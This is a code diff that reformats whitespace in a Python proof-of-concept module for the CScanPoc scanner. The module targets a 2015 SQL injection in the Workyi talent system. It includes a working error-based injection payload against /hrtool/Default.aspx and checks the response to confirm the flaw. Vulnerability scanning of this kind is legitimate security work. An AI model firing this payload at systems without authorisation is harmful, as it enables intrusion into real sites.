@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Workyi_0007' # 平台漏洞编号，留空
+    vuln_id = 'Workyi_0007'  # 平台漏洞编号，留空
     name = 'Workyi人才系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-05-27'  # 漏洞公布时间
     desc = '''
         Workyi人才系统 /hrtool/Default.aspx 页面参数过滤不严谨，导致SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Workyi人才系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'bb75a4c8-7d7d-4b4f-9111-12899e3dc18b'
@@ -30,12 +32,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref: http://www.wooyun.org/bugs/wooyun-2010-0116453
+
+            # ref: http://www.wooyun.org/bugs/wooyun-2010-0116453
             payload = "/hrtool/Default.aspx?PID=convert(int,%27tes%27%2b%27tvul%27)"
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 500 and 'testvul' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
